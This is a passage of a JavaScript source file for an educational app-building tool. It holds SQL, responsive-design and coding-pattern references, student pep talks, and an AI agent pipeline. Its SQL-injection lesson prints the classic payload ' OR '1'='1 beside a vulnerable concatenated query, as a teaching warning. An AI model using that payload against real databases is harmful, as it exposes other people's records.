        { type: 'FULL OUTER JOIN', does: 'All from both, even non-matching' },
        { type: 'CROSS JOIN', does: 'Cartesian product (every combination)' },
      ],
    },
    {
      category: 'INSERT',
      examples: [
        { query: "INSERT INTO students (name, age) VALUES ('Aaron', 14);", does: 'Single row' },
        { query: "INSERT INTO students (name, age) VALUES ('A', 14), ('B', 15);", does: 'Multiple rows' },
        { query: 'INSERT INTO archive SELECT * FROM students WHERE active = false;', does: 'From query' },
      ],
    },
    {
      category: 'UPDATE',
      examples: [
        { query: "UPDATE students SET age = 15 WHERE name = 'Aaron';", does: 'Update specific row' },
        { query: 'UPDATE students SET grade = grade + 1;', does: 'Update all (CAREFUL!)' },
      ],
      WARNING: 'ALWAYS include WHERE. Forgot it once? Wave goodbye to that table.',
    },
    {
      category: 'DELETE',
      examples: [
        { query: "DELETE FROM students WHERE id = 42;", does: 'Specific row' },
        { query: 'DELETE FROM students;', does: 'ALL rows (table itself stays)' },
        { query: 'DROP TABLE students;', does: 'Delete table entirely' },
        { query: 'TRUNCATE TABLE students;', does: 'Faster DELETE all (no log)' },
      ],
      WARNING: 'Same as UPDATE — always include WHERE.',
    },
    {
      category: 'CREATE TABLE',
      example: `CREATE TABLE students (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  name TEXT NOT NULL,
  age INTEGER CHECK (age > 0),
  email TEXT UNIQUE,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
  teacher_id INTEGER,
  FOREIGN KEY (teacher_id) REFERENCES teachers(id)
);`,
      constraints: [
        'PRIMARY KEY: unique identifier',
        'NOT NULL: required field',
        'UNIQUE: no duplicates',
        'DEFAULT: value if not provided',
        'CHECK: custom validation',
        'FOREIGN KEY: references other table',
      ],
    },
    {
      category: 'ALTER TABLE',
      examples: [
        { query: 'ALTER TABLE students ADD COLUMN email TEXT;', does: 'Add column' },
        { query: 'ALTER TABLE students DROP COLUMN email;', does: 'Remove column' },
        { query: 'ALTER TABLE students RENAME COLUMN name TO full_name;', does: 'Rename column' },
        { query: 'ALTER TABLE students RENAME TO learners;', does: 'Rename table' },
      ],
    },
    {
      category: 'INDEX',
      purpose: 'Speed up queries (at cost of writes)',
      examples: [
        { query: 'CREATE INDEX idx_name ON students(name);', does: 'Speed up WHERE name = ...' },
        { query: 'CREATE INDEX idx_grade_age ON students(grade, age);', does: 'Composite index' },
        { query: 'DROP INDEX idx_name;', does: 'Remove index' },
      ],
      whenToUse: 'Columns used in WHERE, JOIN, ORDER BY — that have many distinct values',
    },
    {
      category: 'Subqueries',
      examples: [
        { query: 'SELECT name FROM students WHERE id IN (SELECT student_id FROM tests WHERE score > 90);', does: 'Find students with a 90+ score' },
        { query: 'SELECT name, (SELECT COUNT(*) FROM tests WHERE student_id = s.id) AS test_count FROM students s;', does: 'Computed column' },
      ],
    },
    {
      category: 'NULL handling',
      gotchas: [
        'NULL = NULL is NULL (not true!) — use IS NULL',
        'COUNT(*) counts all, COUNT(col) skips NULLs',
        'NULL in arithmetic = NULL (1 + NULL = NULL)',
        'COALESCE(a, b, c) returns first non-NULL',
        'IFNULL(a, b) returns a if not NULL, else b',
      ],
    },
    {
      category: 'SQL flavors',
      list: [
        { db: 'SQLite', notes: 'Embedded, file-based, perfect for learning + small apps' },
        { db: 'PostgreSQL', notes: 'Open source, feature-rich, defaults for modern apps' },
        { db: 'MySQL / MariaDB', notes: 'Widely deployed, slightly older feature set' },
        { db: 'SQL Server', notes: 'Microsoft, common in enterprise' },
        { db: 'Oracle', notes: 'Enterprise, expensive' },
      ],
      differences: 'Each has small dialect differences (date functions, AUTOINCREMENT vs SERIAL, etc.). Stick to standard SQL when possible.',
    },
    {
      category: 'Common mistakes',
      list: [
        'Forgetting WHERE on UPDATE/DELETE',
        'Comparing with NULL using = (use IS NULL)',
        'SELECT * in production code (returns extra data, breaks if schema changes)',
        'Cartesian products from missing JOIN condition',
        'Not using parameterized queries (SQL injection!)',
        'Missing indexes on common queries',
        'Storing comma-separated values instead of normalizing',
      ],
    },
    {
      category: 'SQL injection (security)',
      bad: `// NEVER do this:
const query = "SELECT * FROM users WHERE name = '" + userInput + "'";
// Attacker submits: ' OR '1'='1
// Resulting query returns all users!`,
      good: `// USE parameterized queries:
db.query("SELECT * FROM users WHERE name = ?", [userInput]);
// or
db.query("SELECT * FROM users WHERE name = $1", [userInput]);`,
      principle: 'NEVER concatenate user input into SQL. Always use placeholders.',
    },
  ];

  // ─── Responsive design reference (verbose) ──────────────────────
  var RESPONSIVE_DESIGN = [
    {
      concept: 'Mobile first',
      description: 'Design for mobile, then enhance for larger screens',
      why: [
        'Most internet traffic is mobile',
        'Mobile constraints force essential-content focus',
        'Easier to add features than remove on small screens',
        'Performance: less CSS to download on mobile',
      ],
      example: `/* Default: mobile */
.container {
  padding: 16px;
  font-size: 16px;
}

/* Enhance for tablet+ */
@media (min-width: 768px) {
  .container {
    padding: 32px;
    font-size: 18px;
  }
}

/* Enhance for desktop+ */
@media (min-width: 1024px) {
  .container {
    padding: 48px;
    max-width: 1200px;
    margin: 0 auto;
  }
}`,
    },
    {
      concept: 'Viewport meta tag',
      description: 'Tell mobile browsers to render at device width',
      essential: '<meta name="viewport" content="width=device-width, initial-scale=1.0">',
      withoutIt: 'Mobile renders at 980px wide, then zooms out. Looks tiny.',
      avoid: 'maximum-scale=1, user-scalable=no — they hurt accessibility',
    },
    {
      concept: 'Breakpoints',
      common: [
        { name: 'xs (mobile)', range: '< 640px', tip: 'Default (mobile-first)' },
        { name: 'sm (large mobile)', range: '≥ 640px', media: '@media (min-width: 640px)' },
        { name: 'md (tablet)', range: '≥ 768px', media: '@media (min-width: 768px)' },
        { name: 'lg (desktop)', range: '≥ 1024px', media: '@media (min-width: 1024px)' },
        { name: 'xl (wide desktop)', range: '≥ 1280px', media: '@media (min-width: 1280px)' },
        { name: '2xl (ultra-wide)', range: '≥ 1536px', media: '@media (min-width: 1536px)' },
      ],
      tip: 'Don\'t target specific devices. Pick breakpoints where your design needs to change.',
    },
    {
      concept: 'Flexbox',
      description: '1D layout (rows OR columns)',
      whenToUse: 'Navigation, card rows, form rows, anything that flows in one direction',
      example: `.container {
  display: flex;
  gap: 16px;
  justify-content: space-between;
  align-items: center;
  flex-wrap: wrap;
}

.item {
  flex: 1 1 200px;  /* grow, shrink, basis */
}`,
      gotcha: 'flex-direction: column flips justify and align. Get used to it.',
    },
    {
      concept: 'CSS Grid',
      description: '2D layout (rows AND columns)',
      whenToUse: 'Page layouts, complex grids, dashboards',
      example: `.container {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 16px;
}

/* Fixed columns at large screens */
@media (min-width: 1024px) {
  .container {
    grid-template-columns: 200px 1fr 300px;
  }
}`,
      power: 'auto-fit + minmax creates responsive without media queries',
    },
    {
      concept: 'Container queries (newer)',
      description: 'Style based on parent size, not viewport',
      example: `.card-container {
  container-type: inline-size;
}

@container (min-width: 400px) {
  .card { display: flex; }
}`,
      support: 'All modern browsers (Chrome 105+, Safari 16+)',
      power: 'Components adapt to their container, not the page',
    },
    {
      concept: 'Fluid typography',
      description: 'Text scales with viewport',
      example: `/* Linear scaling between min and max */
h1 {
  font-size: clamp(1.5rem, 4vw, 3rem);
  /* min 1.5rem, prefer 4% of viewport, max 3rem */
}

p {
  font-size: clamp(1rem, 0.9rem + 0.5vw, 1.25rem);
}`,
      benefit: 'No breakpoints needed for type sizing',
    },
    {
      concept: 'Images',
      tips: [
        'Always set max-width: 100%; height: auto; to prevent overflow',
        'Use <picture> for different images per breakpoint',
        'Use srcset for different resolutions',
        'Lazy load below-fold images: <img loading="lazy">',
        'Use WebP or AVIF for smaller file size',
        'Always include alt text',
      ],
      example: `<img
  src="photo.jpg"
  srcset="photo-1x.jpg 1x, photo-2x.jpg 2x"
  alt="Description"
  loading="lazy"
  style="max-width: 100%; height: auto"
>

<picture>
  <source media="(min-width: 768px)" srcset="large.jpg">
  <source media="(min-width: 480px)" srcset="medium.jpg">
  <img src="small.jpg" alt="Description">
</picture>`,
    },
    {
      concept: 'Touch targets',
      rule: 'Minimum 44×44 pixels for tap targets (Apple HIG)',
      why: 'Fat finger problem on mobile',
      example: `button, a {
  min-width: 44px;
  min-height: 44px;
  padding: 12px 16px;
}`,
      spacing: 'At least 8px between adjacent targets',
    },
    {
      concept: 'Hover-only interactions are broken on touch',
      problem: 'Mobile devices have no hover state',
      example: `/* Bad: only visible on hover */
.dropdown:hover .menu { display: block; }

/* Better: also show on focus and tap */
.dropdown:hover .menu,
.dropdown:focus-within .menu,
.dropdown.open .menu {
  display: block;
}`,
      modern: '@media (hover: hover) { ... } targets devices with real hover',
    },
    {
      concept: 'Forms on mobile',
      tips: [
        'Use type="email" / "tel" / "number" — triggers right keyboard',
        'Use autocomplete attributes (name, email, address)',
        'Avoid placeholder-as-label (disappears when typing)',
        'Make submit button big and obvious',
        'Use inputmode for finer keyboard control',
      ],
      example: '<input type="email" autocomplete="email" inputmode="email">',
    },
    {
      concept: 'Performance for mobile',
      tips: [
        'Optimize images (lazy load, modern formats, srcset)',
        'Minimize JavaScript (especially on critical path)',
        'Use system fonts when possible',
        'Avoid heavy frameworks for small sites',
        'Test on real devices, not just DevTools',
        'Aim for First Contentful Paint < 1.8s on 3G',
      ],
    },
    {
      concept: 'Testing responsive design',
      tools: [
        { tool: 'Chrome DevTools device emulator', use: 'Resize quickly, test specific devices' },
        { tool: 'Firefox responsive design mode', use: 'Similar to Chrome' },
        { tool: 'Real mobile devices', use: 'Most accurate' },
        { tool: 'BrowserStack', use: 'Test on many real devices remotely' },
        { tool: 'Lighthouse mobile audit', use: 'Performance + accessibility scoring' },
      ],
      checklist: [
        'Text is readable without zooming',
        'No horizontal scroll',
        'Tap targets are big enough',
        'Forms work with mobile keyboard',
        'Images don\'t overflow',
        'Page loads quickly on 3G',
        'Works in landscape AND portrait',
      ],
    },
  ];

  // ─── Final tips and motivational content ────────────────────────
  var STUDENT_PEP_TALK = [
    {
      message: 'Every great developer was once a beginner',
      detail: 'The person who wrote your favorite app, the engineer at NASA, the developer of your favorite game — all of them had a first day. They felt confused. They typed the wrong thing. They saw red errors and thought maybe coding wasn\'t for them. You\'re not behind. You\'re right where they started.',
    },
    {
      message: 'Errors are not failure',
      detail: 'An error message is the computer being more honest than humans can be. It\'s telling you exactly what it doesn\'t understand. That\'s a gift. Read the error. Google the error. The fix is always reachable. Every developer reads error messages all day, every day. It\'s the job.',
    },
    {
      message: 'You don\'t have to memorize everything',
      detail: 'Even senior engineers Google syntax constantly. The skill isn\'t memorization. It\'s knowing what to search for, understanding what you read, and knowing how to apply it. Build your problem-solving muscle. The syntax library lives on the internet.',
    },
    {
      message: 'Building beats watching',
      detail: 'Tutorial hell is real. You can watch 100 hours of YouTube and not improve. Pick a project — something small that you actually want to exist. Build it badly. Then build it better. That\'s the entire path.',
    },
    {
      message: 'Compare yourself only to past-you',
      detail: 'Someone on the internet is always more advanced. Someone else just started yesterday. Neither tells you anything about your trajectory. The only useful comparison is: do I understand more than I did last month? If yes, you\'re winning.',
    },
    {
      message: 'Read code, not just write it',
      detail: 'Open source projects on GitHub are libraries you can study for free. Read code in popular projects. You\'ll absorb patterns, conventions, and ideas you\'d never invent alone.',
    },
    {
      message: 'Teach what you learn',
      detail: 'The best way to lock in understanding is to explain it. Tell a friend. Write a blog post. Help a beginner on Discord. Each time you teach, you understand 10% deeper.',
    },
    {
      message: 'Pace yourself',
      detail: 'Burnout is a real risk. Code in sprints with breaks. Sleep matters more than the next 30 minutes of debugging. The bug will still be there tomorrow — and you\'ll see the fix in 30 seconds with a fresh brain.',
    },
    {
      message: 'Imposter syndrome is universal',
      detail: 'Almost every developer you admire feels like they don\'t belong sometimes. That feeling has nothing to do with your ability. It\'s a signal that you\'re growing.',
    },
    {
      message: 'Different paths are valid',
      detail: 'College CS, bootcamp, self-taught, on-the-job — all of these produce great engineers. Pick what fits your life. Make consistent progress. Show your work.',
    },
    {
      message: 'Accessibility is the work',
      detail: 'Building things that work for everyone — including disabled users — isn\'t extra credit. It\'s the job. You\'re not done if your site is unusable with a screen reader or a keyboard.',
    },
    {
      message: 'You\'re building real things',
      detail: 'Apps you build can solve real problems for real people. Your school. Your neighborhood. Your own life. You don\'t need a job title to build something useful.',
    },
  ];

  // ─── App generation patterns (verbose) ──────────────────────────
  var APP_GENERATION_PATTERNS = [
    {
      pattern: 'Single-file HTML app',
      description: 'Everything in one HTML file: structure, styles, scripts',
      whenToUse: 'Demos, prototypes, learning, single-purpose tools',
      pros: ['Easy to share (one file)', 'No build step', 'Works opened from disk', 'Easy to email or download'],
      cons: ['Hard to maintain past a few hundred lines', 'No code reuse', 'Hard to test individual pieces'],
      template: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>App Title</title>
  <style>/* CSS here */</style>
</head>
<body>
  <main>
    <!-- HTML here -->
  </main>
  <script>// JS here</script>
</body>
</html>`,
    },
    {
      pattern: 'Component-style app (vanilla)',
      description: 'Reusable functions that create DOM',
      whenToUse: 'Mid-size apps without a framework',
      example: `function StudentCard({ name, grade }) {
  const card = document.createElement('div');
  card.className = 'student-card';
  card.innerHTML = \`
    <h3>\${escapeHtml(name)}</h3>
    <p>Grade \${escapeHtml(String(grade))}</p>
  \`;
  return card;
}

const list = document.querySelector('#students');
students.forEach(s => list.appendChild(StudentCard(s)));`,
      tip: 'Always escape user input (escapeHtml) to prevent XSS',
    },
    {
      pattern: 'State-driven UI',
      description: 'UI is a function of state',
      example: `let state = { count: 0 };

function render() {
  const root = document.querySelector('#app');
  root.innerHTML = \`
    <p>Count: \${state.count}</p>
    <button onclick="increment()">+</button>
  \`;
}

function increment() {
  state.count++;
  render();
}

render();`,
      reality: 'This re-renders everything on each change. Fine for small UIs. For complex apps, use a framework.',
    },
    {
      pattern: 'Event delegation',
      description: 'Listen on parent, handle for many children',
      example: `// Instead of attaching a listener per item:
list.addEventListener('click', (e) => {
  const item = e.target.closest('.item');
  if (item) {
    const id = item.dataset.id;
    handleItemClick(id);
  }
});`,
      benefit: 'Works for dynamically added items. Less memory.',
    },
    {
      pattern: 'Module pattern',
      description: 'Encapsulate state and functions',
      example: `const Counter = (() => {
  let count = 0;

  return {
    increment() { count++; },
    decrement() { count--; },
    getCount() { return count; },
  };
})();

Counter.increment();
console.log(Counter.getCount());  // 1`,
      modernAlternative: 'ES Modules with import/export',
    },
    {
      pattern: 'Observer pattern',
      description: 'Notify subscribers when state changes',
      example: `class Observable {
  constructor() { this.listeners = []; }
  subscribe(fn) {
    this.listeners.push(fn);
    return () => {
      this.listeners = this.listeners.filter(l => l !== fn);
    };
  }
  notify(data) {
    this.listeners.forEach(fn => fn(data));
  }
}

const events = new Observable();
const unsub = events.subscribe(data => console.log(data));
events.notify('hello');
unsub();`,
    },
    {
      pattern: 'Debounce',
      description: 'Wait until typing stops before searching',
      example: `function debounce(fn, ms) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), ms);
  };
}

const search = debounce((query) => {
  fetch(\`/api/search?q=\${query}\`);
}, 300);

input.addEventListener('input', e => search(e.target.value));`,
    },
    {
      pattern: 'Throttle',
      description: 'Run at most once every N ms',
      example: `function throttle(fn, ms) {
  let lastRun = 0;
  return (...args) => {
    const now = Date.now();
    if (now - lastRun >= ms) {
      lastRun = now;
      fn(...args);
    }
  };
}

window.addEventListener('scroll', throttle(() => {
  // expensive scroll handler
}, 100));`,
    },
    {
      pattern: 'Persisting state to localStorage',
      example: `function saveState(state) {
  try {
    localStorage.setItem('app:state', JSON.stringify(state));
  } catch (err) {
    console.warn('Could not save state', err);
  }
}

function loadState() {
  try {
    const raw = localStorage.getItem('app:state');
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}

const state = loadState() || { count: 0 };
// ...later
saveState(state);`,
      tip: 'Wrap in try/catch — localStorage can fail in private mode or be full',
    },
    {
      pattern: 'Lazy initialization',
      description: 'Compute expensive value only when needed',
      example: `function expensiveSetup() {
  console.log('Setting up...');
  return /* heavy thing */;
}

let _resource;
function getResource() {
  if (!_resource) _resource = expensiveSetup();
  return _resource;
}

// First call: sets up
getResource();
// Subsequent calls: instant
getResource();`,
    },
    {
      pattern: 'Optimistic UI',
      description: 'Update UI immediately, sync to server in background',
      example: `async function addTodo(text) {
  const tempId = Date.now();
  const todo = { id: tempId, text, optimistic: true };

  // Update UI now
  state.todos.push(todo);
  render();

  try {
    const real = await api.create(todo);
    // Replace temp with real
    const idx = state.todos.findIndex(t => t.id === tempId);
    state.todos[idx] = real;
    render();
  } catch (err) {
    // Rollback on failure
    state.todos = state.todos.filter(t => t.id !== tempId);
    render();
    showError('Could not save');
  }
}`,
      benefit: 'App feels instant. User does not wait for the network.',
    },
    {
      pattern: 'Loading states',
      description: 'Always show what is happening',
      stages: ['Initial (no data yet)', 'Loading (fetching)', 'Success (show data)', 'Error (something failed)', 'Empty (nothing to show)'],
      example: `function renderList(state) {
  if (state.loading) return <Spinner />;
  if (state.error) return <ErrorMessage err={state.error} />;
  if (state.data.length === 0) return <EmptyState />;
  return <List items={state.data} />;
}`,
      principle: 'Never leave the user staring at a blank page wondering.',
    },
    {
      pattern: 'Confirm destructive actions',
      example: `async function deleteAll() {
  const yes = confirm('Delete all items? This cannot be undone.');
  if (!yes) return;

  await api.deleteAll();
  state.items = [];
  render();
  showToast('All items deleted');
}`,
      better: 'Build a real modal — confirm() blocks UI and looks unprofessional.',
      best: 'Provide undo for 5 seconds instead of a confirm dialog.',
    },
    {
      pattern: 'Empty states',
      description: 'What to show when there is nothing to show',
      goodEmptyState: [
        'Friendly illustration or icon',
        'Clear explanation of what would go here',
        'Action button to add the first item',
        'Tip on how this section works',
      ],
      example: `<div class="empty-state">
  <img src="/empty-list.svg" alt="">
  <h2>No tasks yet</h2>
  <p>Add your first task to get started.</p>
  <button onclick="openAddForm()">Add Task</button>
</div>`,
    },
    {
      pattern: 'Progressive disclosure',
      description: 'Show advanced options only when wanted',
      example: `<details>
  <summary>Advanced options</summary>
  <fieldset>
    <!-- complex options here -->
  </fieldset>
</details>`,
      benefit: 'Reduces overwhelm. Power users still get access.',
    },
  ];

  // ─── Final closing references ───────────────────────────────────
  var FINAL_REFERENCES = [
    {
      topic: 'Where to ask for help',
      list: [
        { place: 'Stack Overflow', good: 'Specific technical questions', tip: 'Show what you tried' },
        { place: 'Reddit r/learnprogramming', good: 'Beginner questions, career advice', tip: 'Searchable archive' },
        { place: 'Discord communities (Reactiflux, etc.)', good: 'Real-time help', tip: 'Most languages and frameworks have one' },
        { place: 'GitHub issues', good: 'Bug in a library', tip: 'Search closed issues first' },
        { place: 'MDN web docs', good: 'Official web platform reference', tip: 'Best for HTML/CSS/JS/Web APIs' },
        { place: 'Your teacher or mentor', good: 'Specific to your project', tip: 'They want you to ask' },
      ],
    },
    {
      topic: 'Productive habits',
      list: [
        'Code every day, even briefly',
        'Read code from projects you admire',
        'Build something you would use',
        'Keep a "learned today" log',
        'Sleep on hard problems',
        'Write tests for tricky parts',
        'Commit early and often',
      ],
    },
    {
      topic: 'Anti-patterns to avoid',
      list: [
        'Copy-pasting without understanding',
        'Adding code "just in case" you might need it',
        'Premature optimization',
        'Big rewrites instead of incremental change',
        'Skipping accessibility because it is "optional"',
        'Ignoring error states until production',
      ],
    },
    {
      topic: 'Words to know your way around code reviews',
      list: [
        'LGTM — Looks Good To Me (approval)',
        'WIP — Work In Progress (not ready)',
        'Nit — minor stylistic suggestion',
        'TIL — Today I Learned',
        'IIRC — If I Recall Correctly',
        'FYI — For Your Information',
        'AFAIK — As Far As I Know',
        'IMO/IMHO — In My (Humble) Opinion',
        'PR — Pull Request',
        'MR — Merge Request (GitLab term for PR)',
        'CI — Continuous Integration (auto tests)',
        'CD — Continuous Deployment (auto deploys)',
        'EOD — End of Day',
        'YAGNI — You Aren\'t Gonna Need It (don\'t build maybe-features)',
        'DRY — Don\'t Repeat Yourself',
        'KISS — Keep It Simple, Stupid',
        'SOLID — five OOP design principles',
        'BDFL — Benevolent Dictator For Life (Python: Guido)',
        'RFC — Request For Comments (formal proposal)',
        'TBD — To Be Determined',
        'NIT — minor styling-level comment',
        'OOO — Out Of Office',
      ],
    },
    {
      topic: 'Last word',
      list: [
        'Coding is a craft. You get better by practicing.',
        'Build things you would actually use.',
        'Ship small projects often, not one giant project never.',
        'Accessibility, security, and ethics are part of the work.',
        'When stuck, take a walk. Brains solve problems offline.',
        'The world needs more makers. You\'re one now.',
      ],
    },
  ];

  var TEMPLATES = [
    { cat: 'Physics', items: [
      { title: 'Projectile Motion', prompt: 'Interactive projectile motion simulator with adjustable angle, velocity, and gravity. Show trajectory path, max height, and range. Include a launch button and real-time animation.' },
      { title: 'Pendulum Lab', prompt: 'Simple pendulum simulation with adjustable length and mass. Show period calculation, energy bar (kinetic vs potential), and real-time swinging animation on a canvas.' },
      { title: 'Wave Interference', prompt: 'Two-source wave interference pattern visualizer. Adjustable frequency and wavelength sliders. Show constructive and destructive interference with color-coded amplitude map.' },
    ]},
    { cat: 'Chemistry', items: [
      { title: 'pH Scale Explorer', prompt: 'Interactive pH scale (0-14) with common substances. Click a substance to see its pH, color indicator, and whether it is acidic, neutral, or basic. Include litmus paper color change animation.' },
      { title: 'Reaction Rate Lab', prompt: 'Chemical reaction rate simulator. Adjustable temperature, concentration, and surface area sliders. Show particle collision animation and rate graph updating in real-time.' },
    ]},
    { cat: 'Biology', items: [
      { title: 'Cell Division', prompt: 'Animated mitosis visualization showing all phases: Interphase, Prophase, Metaphase, Anaphase, Telophase, Cytokinesis. Step-by-step with labels, play/pause, and descriptions of each phase.' },
      { title: 'Food Web Builder', prompt: 'Interactive food web diagram where users can click organisms to see what they eat and what eats them. Include at least 10 organisms across producers, primary consumers, secondary consumers, and decomposers. Arrows show energy flow.' },
    ]},
    { cat: 'Math', items: [
      { title: 'Function Grapher', prompt: 'Interactive function grapher where users type a math function (like y=sin(x), y=x^2, y=2x+1) and see it plotted on a coordinate grid. Support zoom, pan, and multiple functions in different colors.' },
      { title: 'Fractal Explorer', prompt: 'Mandelbrot set fractal viewer with click-to-zoom. Color palette selector. Show coordinates and zoom level. Canvas-based rendering with smooth color gradients.' },
    ]},
    { cat: 'Earth Science', items: [
      { title: 'Plate Tectonics', prompt: 'Interactive plate tectonics diagram showing convergent, divergent, and transform boundaries. Click each type to see animated cross-section with labels for subduction, rift valleys, and earthquakes.' },
      { title: 'Water Cycle', prompt: 'Animated water cycle diagram with evaporation, condensation, precipitation, and collection. Click each stage to learn about it. Include temperature and humidity indicators.' },
    ]},
    { cat: 'General', items: [
      { title: 'Quiz Builder', prompt: 'A simple quiz app where users can add questions with 4 multiple choice answers, mark the correct one, and then take the quiz with scoring and review.' },
      { title: 'Interactive Timer', prompt: 'A beautiful countdown timer and stopwatch with customizable colors, alarm sound, lap tracking, and full-screen mode. Include preset buttons for common times (1min, 5min, 10min).' },
    ]},
  ];

  window.StemLab.registerTool('appLab', {
    title: 'AppLab',
    icon: '\uD83D\uDCA1',
    description: 'Describe an app or science demo and AI builds it instantly. Edit the code, iterate, and export.',
    category: 'technology',
    gradeRange: 'K-12',
    questHooks: [
      { id: 'first_app', label: 'Generate your first app', icon: '\uD83D\uDE80', check: function(d) { return (d.appsGenerated || 0) >= 1; }, progress: function(d) { return (d.appsGenerated || 0) >= 1 ? 'Created!' : 'Not yet'; } },
      { id: 'three_apps', label: 'Create 3 different apps', icon: '\uD83C\uDFC6', check: function(d) { return (d.appsGenerated || 0) >= 3; }, progress: function(d) { return (d.appsGenerated || 0) + '/3'; } },
      { id: 'edit_code', label: 'Edit the source code of an app', icon: '\u270F\uFE0F', check: function(d) { return !!d.hasEditedCode; }, progress: function(d) { return d.hasEditedCode ? 'Edited!' : 'Not yet'; } },
      { id: 'iterate', label: 'Use "Enhance" to modify an app', icon: '\u2728', check: function(d) { return (d.enhanceCount || 0) >= 1; }, progress: function(d) { return (d.enhanceCount || 0) >= 1 ? 'Enhanced!' : 'Not yet'; } },
    ],
    render: function(ctx) {
      var React = ctx.React;
      var h = React.createElement;
      var useState = React.useState;
      var useCallback = React.useCallback;
      var useRef = React.useRef;
      var d = (ctx.toolData && ctx.toolData.appLab) || {};
      var upd = function(key, val) { ctx.setToolData(function(prev) { var td = Object.assign({}, (prev && prev.appLab) || {}); td[key] = val; var patch = {}; patch.appLab = td; return Object.assign({}, prev, patch); }); };
      var callGemini = ctx.callGemini;
      var addToast = ctx.addToast;
      var awardXP = ctx.awardXP;
      var gradeLevel = ctx.gradeLevel || '5th Grade';
      var announceToSR = ctx.announceToSR;
      var ArrowLeft = ctx.icons.ArrowLeft;

      // ── Pipeline Agent Definitions (configurable) ──
      var PIPELINE_AGENTS = [
        { id: 'architect', name: 'Architect', icon: '\uD83C\uDFD7\uFE0F', color: '#818cf8',
          desc: 'Plans the app structure, features, and accessibility requirements before any code is written.',
          learnMore: 'In software engineering, architects design systems before developers write code. This separation of "thinking" from "doing" produces better results because planning prevents structural mistakes that are expensive to fix later.',
          required: false, defaultOn: true },
        { id: 'builder', name: 'Builder', icon: '\uD83D\uDD28', color: '#34d399',
          desc: 'Writes the actual HTML, CSS, and JavaScript code based on the plan (or from scratch if Architect is off).',
          learnMore: 'The Builder agent uses a Large Language Model (LLM) that has been trained on billions of lines of code. It understands programming patterns, HTML structure, CSS styling, and JavaScript logic. When given a plan, it produces higher quality code than when improvising.',
          required: true, defaultOn: true },
        { id: 'reviewer', name: 'Reviewer', icon: '\uD83D\uDD0D', color: '#fbbf24',
          desc: 'A separate AI reads the code with fresh eyes to find bugs, accessibility issues, and UX problems.',
          learnMore: 'Code review is a standard practice in professional software development. A different person (or AI) reviewing code catches mistakes the original author missed. This works because of "fresh eyes" — the reviewer has no assumptions about what the code should do.',
          required: false, defaultOn: true },
        { id: 'fixer', name: 'Fixer', icon: '\uD83D\uDD27', color: '#f87171',
          desc: 'Takes the Reviewer\'s feedback and applies targeted fixes. Only runs if issues were found.',
          learnMore: 'The Fixer receives a specific list of bugs to fix, not a vague "make it better" request. This targeted approach is more reliable than asking an AI to find AND fix issues simultaneously — a principle called "separation of concerns."',
          required: false, defaultOn: true }
      ];

      // State
      var _pipelineConfig = useState(function() {
        try { var saved = JSON.parse(localStorage.getItem('alloAppLabPipeline') || 'null'); if (saved) return saved; } catch(e) {}
        return PIPELINE_AGENTS.map(function(a) { return { id: a.id, enabled: a.defaultOn }; });
      });
      var pipelineConfig = _pipelineConfig[0]; var setPipelineConfig = _pipelineConfig[1];
      var _showPipelineConfig = useState(false); var showPipelineConfig = _showPipelineConfig[0]; var setShowPipelineConfig = _showPipelineConfig[1];
      var _pipelineLive = useState(null); var pipelineLive = _pipelineLive[0]; var setPipelineLive = _pipelineLive[1]; // which agent is currently running

      function toggleAgent(agentId) {
        var agent = PIPELINE_AGENTS.find(function(a) { return a.id === agentId; });
        if (agent && agent.required) return; // can't disable required agents
        var updated = pipelineConfig.map(function(c) {
          return c.id === agentId ? { id: c.id, enabled: !c.enabled } : c;
        });
        setPipelineConfig(updated);
        try { localStorage.setItem('alloAppLabPipeline', JSON.stringify(updated)); } catch(e) {}
      }
      function moveAgent(agentId, direction) {
        var idx = pipelineConfig.findIndex(function(c) { return c.id === agentId; });
        if (idx < 0) return;
        var newIdx = idx + direction;
        if (newIdx < 0 || newIdx >= pipelineConfig.length) return;
        var updated = pipelineConfig.slice();
        var temp = updated[idx]; updated[idx] = updated[newIdx]; updated[newIdx] = temp;
        setPipelineConfig(updated);
        try { localStorage.setItem('alloAppLabPipeline', JSON.stringify(updated)); } catch(e) {}
      }

      var _prompt = useState(''); var prompt = _prompt[0]; var setPrompt = _prompt[1];
      var _html = useState(''); var html = _html[0]; var setHtml = _html[1];
      var _editHtml = useState(''); var editHtml = _editHtml[0]; var setEditHtml = _editHtml[1];
      var _isGenerating = useState(false); var isGenerating = _isGenerating[0]; var setIsGenerating = _isGenerating[1];
      var _genStep = useState(''); var genStep = _genStep[0]; var setGenStep = _genStep[1];
      var _showCode = useState(false); var showCode = _showCode[0]; var setShowCode = _showCode[1];
      var _enhancePrompt = useState(''); var enhancePrompt = _enhancePrompt[0]; var setEnhancePrompt = _enhancePrompt[1];
      var _history = useState([]); var history = _history[0]; var setHistory = _history[1];
      var _historyIdx = useState(-1); var historyIdx = _historyIdx[0]; var setHistoryIdx = _historyIdx[1];
      var _gallery = useState(function() { try { return JSON.parse(localStorage.getItem(STORAGE_GALLERY) || '[]'); } catch(e) { return []; } });
      var gallery = _gallery[0]; var setGallery = _gallery[1];
      var _showGallery = useState(false); var showGallery = _showGallery[0]; var setShowGallery = _showGallery[1];
      var _showSuggestions = useState(false); var showSuggestions = _showSuggestions[0]; var setShowSuggestions = _showSuggestions[1];
      var _suggestions = useState([]); var suggestions = _suggestions[0]; var setSuggestions = _suggestions[1];
      var _sugLoading = useState(false); var sugLoading = _sugLoading[0]; var setSugLoading = _sugLoading[1];
      var _fullscreen = useState(false); var fullscreen = _fullscreen[0]; var setFullscreen = _fullscreen[1];
      var _iframeErrors = useState([]); var iframeErrors = _iframeErrors[0]; var setIframeErrors = _iframeErrors[1];
      var iframeRef = useRef(null);

      // ── Clean AI HTML response ──
      function cleanHtmlResponse(result) {
        var cleaned = (result || '').replace(/^```html\s*/i, '').replace(/```\s*$/i, '').trim();
        if (!cleaned.toLowerCase().startsWith('<!doctype') && !cleaned.toLowerCase().startsWith('<html')) {
          var htmlIdx = cleaned.toLowerCase().indexOf('<!doctype');
          if (htmlIdx === -1) htmlIdx = cleaned.toLowerCase().indexOf('<html');
